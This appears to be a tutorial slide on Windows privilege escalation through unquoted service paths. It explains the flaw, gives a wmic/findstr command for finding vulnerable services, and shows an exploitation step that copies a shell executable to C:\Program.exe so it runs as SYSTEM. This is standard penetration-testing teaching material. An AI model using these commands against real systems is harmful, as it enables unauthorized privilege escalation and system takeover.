Unquoted Service Paths - Hijacking Execution

Leveraging Windows Path Interpretation Flaws

The Vulnerability

A service's executable path contains spaces and is not enclosed in quotes, causing Windows to misinterpret the path.

Execution Hijack

Windows attempts to execute each path segment (e.g., C:\Program.exe) with service privileges before the full path.

Achieving SYSTEM

If a malicious executable is placed in an earlier writable path segment, it will run with the service's elevated privileges.

Identifying Unquoted Paths
C:\Users\User> wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\" | findstr /i /v """

  # Example Output:
  DisplayName          Name                 PathName                                StartMode
  -----------          ----                 --------                                ---------
  Vulnerable Service   VulnerableService    C:\Program Files\Unquoted Path Service\service.exe Auto

# Exploitation Example:
C:\Users\User> copy C:\Users\User\Desktop\shell.exe C:\Program.exe
  1 file(s) copied.

# Service restart will now execute C:\Program.exe with SYSTEM privileges.
Key Takeaway

Always check service paths for unquoted entries with spaces; these are prime targets for injecting malicious executables and gaining SYSTEM access.
